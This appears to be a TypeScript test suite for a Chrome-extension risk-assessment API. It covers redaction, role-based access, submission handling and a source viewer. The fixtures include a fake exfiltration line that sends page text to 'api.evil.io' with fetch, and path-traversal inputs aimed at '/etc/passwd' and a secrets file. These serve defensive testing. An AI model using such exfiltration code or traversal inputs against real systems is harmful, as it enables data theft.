// Explorer API tests (plan §13 phases 0, 2–5): boots the Hono app in-process
// (app.request — no listener needed) against a temp DB seeded via recordRun.
// Asserts the two invariants the whole product hangs on:
//   1. redaction — no admin-only byte (cost/tokens/pipeline/ground-truth) in a
//      User response;
//   2. authorization — admin-only reports and ground-truth-only extensions
//      read as 404 for a User, indistinguishable from "not assessed".
// Plus the full submission flow: validate → dedup → queue → claim/complete →
// done (the runner daemon drives claim/complete in production; tests drive the
// same service calls directly).

import { describe, it, expect, beforeAll } from "vitest";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Hono } from "hono";
import { openDb, recordRun } from "../src/db/index.ts";
import { SqliteDataSource } from "../src/product/datasource.ts";
import { DEFAULT_PROFILE } from "../src/product/profile.ts";
import { createApp } from "../src/server/app.ts";
import type { AppEnv } from "../src/server/role.ts";
import { claimNextSubmission, completeSubmission } from "../src/jobs/service.ts";
import { canonicalReport } from "../src/product/canonical.ts";
import { parseStoreInput } from "../src/jobs/validate.ts";

const RICH = "a".repeat(32); // pi + monolith + ground-truth
const GT_ONLY = "c".repeat(32); // ground-truth only
const UNSEEN = "d".repeat(32); // valid id, never assessed
const UNSEEN2 = "e".repeat(32); // ditto — a second, so tests don't consume each other's

function richRiskReport(storeId: string) {
  return {
    extension: { name: "Rich Ext", version: "2.0", manifest_version: 3, store_id: storeId },
    verdict: {
      tier: "high-risk",
      rationale: "Sends page content to unknown hosts. Broad access compounds it.",
      per_area: [
        { area: "permissions", level: "high", note: "cookies + all sites" },
        { area: "network", level: "notable", note: "3 unknown hosts" },
      ],
    },
    summaries: { layperson: "It reads what you type.", technical: "Content-script exfil via fetch." },
    description_deviation: { stated_purpose: "A helpful tool.", deviates: true },
    findings: [
      {
        number: 2, id: "f2", kind: "observed-capability", title: "cookie read", severity: "medium",
        category: "permissions", finding_type: "risky-capability", detail: "reads cookies", confidence: "high",
        evidence_refs: [{ file: "bg.js", location: { line: 3 }, symbol: null, sink_or_string: "cookies.getAll" }],
      },
      {
        number: 1, id: "f1", kind: "verified-behavior", title: "exfil to api.evil.io", severity: "critical",
        category: "data-exfiltration", finding_type: "malicious", detail: "sends page text", confidence: "high",
        evidence_refs: [{ file: "js/background.js", location: { line: 412 }, symbol: null, sink_or_string: "fetch" }],
      },
    ],
    excluded_claims: [{ id: "x1", title: "keylogging", reason: "needs-dynamic", detail: "not verifiable statically" }],
    dismissals: [{ concern: "obfuscation", note: "none found", checks_run: ["entropy scan"] }],
    permissions: {
      api: [{ permission: "cookies", optional: false, status: "used", usage: [], total_usage: 1 }],
      hosts: { required: ["<all_urls>"], optional: [] },
      hosts_plain: "All websites.",
      dangerous_combinations: [{ kind: "cookies+broad-host", evidence: ["cookies", "<all_urls>"] }],
    },
    destinations: {
      rows: [{ host: "api.evil.io", references: 2, any_dynamic: true, reached_via: ["fetch"], party: "unknown" }],
      unresolved: ["dyn1", "dyn2"],
    },
    obfuscation: { flagged: [{ path: "js/min.js", identifier_entropy: 4.2 }] },
    developer: {
      name: "Evil Corp", email: "e@evil.io", website: "https://evil.io", country: "XX",
      is_trader: false, high_risk_country: true, update_url: "https://evil.io/u", non_store_update_url: true,
    },
    coverage: { opaque_regions: 1, indirect_calls: 0, unresolved_destinations: 2, unparsed_files: ["broken.js"], structural_limits: ["static only"] },
  };
}

let ds: SqliteDataSource;
let app: Hono<AppEnv>;
let piReportId: number;
let gtReportId: number;

/* eslint-disable @typescript-eslint/no-explicit-any */
interface ApiResponse {
  status: number;
  json(): Promise<any>; // test-side: assert freely against parsed payloads
}
function get(path: string, role: "user" | "admin"): Promise<ApiResponse> {
  return Promise.resolve(app.request(path, { headers: { "x-explorer-role": role } }));
}
function post(path: string, role: "user" | "admin", body: unknown): Promise<ApiResponse> {
  return Promise.resolve(
    app.request(path, {
      method: "POST",
      headers: { "x-explorer-role": role, "content-type": "application/json" },
      body: JSON.stringify(body),
    }),
  );
}

beforeAll(async () => {
  process.env.EXPLORER_STUB_DELAY_MS = "0";
  const dir = mkdtempSync(join(tmpdir(), "explorer-api-"));
  const db = openDb(join(dir, "test.sqlite"));

  const assess = (methodology: string, model: string, storeId: string, startedAt: string, rr?: object) =>
    recordRun(db, {
      kind: "assess", methodology, model, startedAt,
      targets: [{
        storeId, isCorpus: false, sourceDir: `example_crxs/${storeId}`,
        structured: { risk_report: rr ?? richRiskReport(storeId) },
        usage: { inputTokens: 100, outputTokens: 50 }, estimatedUsd: 0.04,
      }],
    });

  assess("pi", "glm-5.2:cloud", RICH, "2026-06-24T00:00:00Z");
  assess("monolith", "glm-5.2:cloud", RICH, "2026-06-20T00:00:00Z");
  assess("ground-truth", "claude-opus-4-8", RICH, "2026-06-25T00:00:00Z");
  assess("ground-truth", "claude-opus-4-8", GT_ONLY, "2026-06-22T00:00:00Z");

  ds = new SqliteDataSource(db);
  piReportId = (await ds.get(
    "SELECT rep.id FROM report rep JOIN run r ON r.id=rep.run_id WHERE r.methodology='pi'",
  ))!.id as number;
  gtReportId = (await ds.get(
    `SELECT rep.id FROM report rep JOIN run r ON r.id=rep.run_id JOIN target t ON t.id=rep.target_id
     WHERE r.methodology='ground-truth' AND t.store_id = ?`,
    RICH,
  ))!.id as number;

  app = createApp({ ds, profile: DEFAULT_PROFILE, sourceReader: fakeSourceReader });
});

// In-memory stand-in for the fs reader: 500 numbered lines with the evidence
// sink parked at line 412 (matching richRiskReport's f1 evidence ref).
const FAKE_BG_JS = Array.from({ length: 500 }, (_, i) =>
  i === 411 ? "  fetch('https://api.evil.io/c', { body: pageText });" : `// line ${i + 1}`,
).join("\n");
const FAKE_TREES: Record<string, Record<string, string>> = {
  [`example_crxs/${RICH}`]: { "js/background.js": FAKE_BG_JS },
};
function fakeSourceReader(sourceDir: string, relPath: string): string | null {
  return FAKE_TREES[sourceDir]?.[relPath] ?? null;
}

describe("input validation", () => {
  it("accepts bare ids and store URLs, rejects everything else", () => {
    expect(parseStoreInput(RICH)).toBe(RICH);
    expect(parseStoreInput(` https://chromewebstore.google.com/detail/some-slug/${RICH}?hl=en `.trim())).toBe(RICH);
    expect(parseStoreInput("https://chrome.google.com/webstore/detail/x/" + RICH)).toBe(RICH);
    expect(parseStoreInput("not an id")).toBeNull();
    expect(parseStoreInput("z".repeat(32))).toBeNull(); // outside a–p
    expect(parseStoreInput(`http://evil.example/${RICH}`)).toBeNull(); // not a store URL
    expect(parseStoreInput(42)).toBeNull();
  });
});

describe("role gate (phase 0)", () => {
  it("GET /api/meta returns enums; role list is admin-only", async () => {
    const user = await (await get("/api/meta", "user")).json();
    const admin = await (await get("/api/meta", "admin")).json();
    expect(user.tiers).toContain("high-risk");
    expect(user.findingTypes).toContain("malicious");
    expect(user.roles).toBeUndefined();
    expect(admin.roles).toEqual(["user", "admin"]);
  });

  it("GET /api/stats: cost totals are admin-only; counts are role-scoped", async () => {
    const user = await (await get("/api/stats", "user")).json();
    const admin = await (await get("/api/stats", "admin")).json();
    expect(user.total).toBe(1); // RICH only — GT_ONLY is invisible
    expect(user.totalCostUsd).toBeUndefined();
    expect(admin.total).toBe(2);
    expect(admin.totalCostUsd).toBeGreaterThan(0);
  });
});

describe("catalog (phase 2)", () => {
  it("role-scoped candidate set and columns", async () => {
    const user = await (await get("/api/catalog", "user")).json();
    const admin = await (await get("/api/catalog", "admin")).json();
    expect(user.total).toBe(1);
    expect(admin.total).toBe(2);
    const userRow = user.rows[0];
    expect(userRow.storeId).toBe(RICH);
    expect(userRow.pipeline).toBeUndefined();
    expect(userRow.costUsd).toBeUndefined();
    expect(userRow.tokens).toBeUndefined();
    const adminRich = admin.rows.find((r: { storeId: string }) => r.storeId === RICH);
    expect(adminRich.pipeline).toEqual({ methodology: "pi", model: "glm-5.2:cloud", isFallback: false });
    expect(adminRich.costUsd).toBeCloseTo(0.04);
  });

  it("search and filters narrow the set", async () => {
    const byName = await (await get("/api/catalog?q=rich", "user")).json();
    expect(byName.total).toBe(1);
    const miss = await (await get("/api/catalog?q=zzz-no-match", "user")).json();
    expect(miss.total).toBe(0);
    const tier = await (await get("/api/catalog?tier=high-risk", "user")).json();
    expect(tier.total).toBe(1);
    const access = await (await get("/api/catalog?access=cookies", "user")).json();
    expect(access.total).toBe(1);
    const dev = await (await get("/api/catalog?developer=high-risk-country", "user")).json();
    expect(dev.total).toBe(1);
    const devMiss = await (await get("/api/catalog?developer=trader", "user")).json();
    expect(devMiss.total).toBe(0);
    const malicious = await (await get("/api/catalog?findingType=malicious", "user")).json();
    expect(malicious.total).toBe(1);
    const ftypeMiss = await (await get("/api/catalog?findingType=unwanted", "user")).json();
    expect(ftypeMiss.total).toBe(0);
  });
});

describe("extension detail (phase 3)", () => {
  it("User detail: full evidence, zero pipeline/cost/ground-truth bytes", async () => {
    const res = await get(`/api/extensions/${RICH}`, "user");
    expect(res.status).toBe(200);
    const d = await res.json();
    expect(d.verdict.tier).toBe("high-risk");
    expect(d.verdict.headline).toBe("Sends page content to unknown hosts.");
    expect(d.findings[0].severity).toBe("critical"); // critical first
    expect(d.findings[0].evidence[0]).toEqual({ file: "js/background.js", line: 412, symbolOrSink: "fetch" });
    expect(d.partialAnalysis).toBe(true); // unparsed_files non-empty
    expect(d.dismissals).toHaveLength(1);
    expect(d.structuralLimits).toEqual(["static only"]);
    // Redaction: absent, not nulled.
    expect(d.cost).toBeUndefined();
    expect(d.otherAnalyses).toBeUndefined();
    expect(d.provenance.pipeline).toBeUndefined();
    expect(JSON.stringify(d)).not.toContain("ground-truth");
    expect(JSON.stringify(d)).not.toContain("glm-5.2");
  });

  it("Admin detail adds pipeline, cost, and the other-analyses index", async () => {
    const d = await (await get(`/api/extensions/${RICH}`, "admin")).json();
    expect(d.provenance.pipeline.methodology).toBe("pi");
    expect(d.provenance.pipeline.isFallback).toBe(false);
    expect(d.cost.usd).toBeCloseTo(0.04);
    expect(d.otherAnalyses).toHaveLength(3);
    expect(d.otherAnalyses.some((o: { methodology: string }) => o.methodology === "ground-truth")).toBe(true);
    expect(d.otherAnalyses.find((o: { isCanonical: boolean }) => o.isCanonical).reportId).toBe(piReportId);
  });

  it("ground-truth-only extension: 404 for User, 200 for Admin", async () => {
    expect((await get(`/api/extensions/${GT_ONLY}`, "user")).status).toBe(404);
    expect((await get(`/api/extensions/${GT_ONLY}`, "admin")).status).toBe(200);
  });

  it("malformed / unknown ids are 404", async () => {
    expect((await get("/api/extensions/not-a-store-id", "admin")).status).toBe(404);
    expect((await get(`/api/extensions/${UNSEEN}`, "admin")).status).toBe(404);
  });
});

describe("report fetch authz (phase 4)", () => {
  it("a User may fetch a user-visible report, never a ground-truth one", async () => {
    expect((await get(`/api/reports/${piReportId}`, "user")).status).toBe(200);
    expect((await get(`/api/reports/${gtReportId}`, "user")).status).toBe(404); // existence not leaked
    expect((await get(`/api/reports/${gtReportId}`, "admin")).status).toBe(200);
  });
});

describe("submissions (phase 5)", () => {
  it("rejects malformed input at the edge", async () => {
    expect((await post("/api/submissions", "user", { input: "drop table" })).status).toBe(400);
    expect((await post("/api/submissions", "user", "nope")).status).toBe(400);
  });

  // Locally, `serve` is its own analysis worker (scripts/explorer-capabilities.ts
  // makeSubmissionRunner). Without this nudge a laptop submission sits at
  // "queued" forever waiting for a drain process that only exists in the
  // hosted deployment — the exact broken-looking path W3.5 fixes.
  it("nudges the local runner on a NEW job, and only on a new job", async () => {
    const kicks: number[] = [];
    const local = createApp({ ds, profile: DEFAULT_PROFILE, runSubmission: () => kicks.push(1) }) as Hono<AppEnv>;
    const send = (body: unknown) =>
      local.request("/api/submissions", {
        method: "POST",
        headers: { "x-explorer-role": "user", "content-type": "application/json" },
        body: JSON.stringify(body),
      });

    expect((await send({ input: UNSEEN2 })).status).toBe(201);
    expect(kicks.length).toBe(1);
    // Joining the in-flight job is not new work; neither is a malformed input.
    await send({ input: UNSEEN2 });
    await send({ input: "drop table" });
    expect(kicks.length).toBe(1);

    // Leave the shared queue as we found it — the later tests claim from it.
    await completeSubmission(ds, (await claimNextSubmission(ds))!.id, { status: "failed", error: "test cleanup" });
  });

  it("dedups against an existing verdict unless forced", async () => {
    const res = await post("/api/submissions", "user", { input: RICH });
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ existing: true, storeId: RICH });
  });

  it("full flow: queue → tick → succeeded with result (existing ext, forced)", async () => {
    const created = await post("/api/submissions", "user", { input: RICH, force: true });
    expect(created.status).toBe(201);
    const job = await created.json();
    expect(job.status).toBe("queued");
    expect(job.costUsd).toBeUndefined(); // user never sees cost

    // Re-POST while queued joins the same job (active dedup).
    const dup = await post("/api/submissions", "user", { input: RICH, force: true });
    expect((await dup.json()).jobId).toBe(job.jobId);

    // Process the job the way the runner does: claim, resolve, complete.
    const claimed = (await claimNextSubmission(ds))!;
    expect(claimed.id).toBe(job.jobId);
    const existing = (await canonicalReport(ds, "user", claimed.storeId!, DEFAULT_PROFILE))!;
    await completeSubmission(ds, claimed.id, { status: "succeeded", resultReportId: existing.reportId });
    // Users poll with the job's storeId (the ownership token the submit page
    // carries in its URL); the dev shim attaches no email.
    const done = await (await get(`/api/submissions/${job.jobId}?storeId=${RICH}`, "user")).json();
    expect(done.status).toBe("succeeded");
    expect(done.resultStoreId).toBe(RICH);
    expect(done.costUsd).toBeUndefined();

    const adminView = await (await get(`/api/submissions/${job.jobId}`, "admin")).json();
    expect(adminView.costUsd).toBeCloseTo(0.04);
  });

  it("ownership: a job id alone is not enough for a non-admin poller", async () => {
    const created = await post("/api/submissions", "user", { input: RICH, force: true });
    const job = await created.json();
    // No email (dev shim) and no storeId: reads as missing, not forbidden.
    expect((await get(`/api/submissions/${job.jobId}`, "user")).status).toBe(404);
    // Wrong storeId: same.
    expect((await get(`/api/submissions/${job.jobId}?storeId=${GT_ONLY}`, "user")).status).toBe(404);
    // The right storeId or the admin role unlocks it.
    expect((await get(`/api/submissions/${job.jobId}?storeId=${RICH}`, "user")).status).toBe(200);
    expect((await get(`/api/submissions/${job.jobId}`, "admin")).status).toBe(200);
    // Drain the queued job so later tests see an empty queue.
    const claimed = (await claimNextSubmission(ds))!;
    expect(claimed.id).toBe(job.jobId);
    await completeSubmission(ds, claimed.id, { status: "failed", error: "test drain" });
  });

  it("failed analysis surfaces status + error to the poller", async () => {
    const created = await post("/api/submissions", "user", { input: UNSEEN });
    expect(created.status).toBe(201);
    const job = await created.json();
    const claimed = (await claimNextSubmission(ds))!;
    await completeSubmission(ds, claimed.id, { status: "failed", error: "analysis failed: fetch error" });
    const done = await (await get(`/api/submissions/${job.jobId}?storeId=${UNSEEN}`, "user")).json();
    expect(done.status).toBe("failed");
    expect(done.error).toMatch(/analysis failed/);
  });

  it("unknown job ids are 404", async () => {
    expect((await get("/api/submissions/999999", "user")).status).toBe(404);
  });
});

describe("evidence source viewer", () => {
  const SRC = (q: string) => `/api/extensions/${RICH}/source?${q}`;

  it("serves a line window centered on the cited line", async () => {
    const res = await get(SRC("path=js/background.js&line=412"), "admin");
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.totalLines).toBe(500);
    expect(body.firstLine).toBe(412 - 60);
    expect(body.lines[412 - body.firstLine]).toContain("api.evil.io");
  });

  it("user lens resolves through its own canonical report", async () => {
    const res = await get(SRC("path=js/background.js&line=412"), "user");
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.lines[412 - body.firstLine]).toContain("api.evil.io");
  });

  it("no line param starts the window at the top of the file", async () => {
    const body = await (await get(SRC("path=js/background.js"), "admin")).json();
    expect(body.firstLine).toBe(1);
    expect(body.lines[0]).toBe("// line 1");
  });

  it("rejects traversal, absolute, and malformed paths", async () => {
    expect((await get(SRC("path=../secrets.txt"), "admin")).status).toBe(400);
    expect((await get(SRC("path=js/../../etc/passwd"), "admin")).status).toBe(400);
    expect((await get(SRC(`path=${encodeURIComponent("/etc/passwd")}`), "admin")).status).toBe(400);
    expect((await get(SRC(`path=${encodeURIComponent("js\\background.js")}`), "admin")).status).toBe(400);
    expect((await get(SRC("path="), "admin")).status).toBe(400);
  });

  it("unknown files and unassessed extensions are 404", async () => {
    expect((await get(SRC("path=js/nope.js"), "admin")).status).toBe(404);
    expect((await get(`/api/extensions/${UNSEEN}/source?path=a.js`, "admin")).status).toBe(404);
  });

  it("report param is authorized like /api/reports/:id", async () => {
    // A User naming the ground-truth report reads as 404 — indistinguishable
    // from a report that does not exist.
    expect((await get(SRC(`path=js/background.js&report=${gtReportId}`), "user")).status).toBe(404);
    expect((await get(SRC(`path=js/background.js&report=${gtReportId}`), "admin")).status).toBe(200);
  });

  it("degrades to 404 when no reader is configured (hosted deployment)", async () => {
    const bare = createApp({ ds, profile: DEFAULT_PROFILE });
    const res = await bare.request(SRC("path=js/background.js"), {
      headers: { "x-explorer-role": "admin" },
    });
    expect(res.status).toBe(404);
  });
});
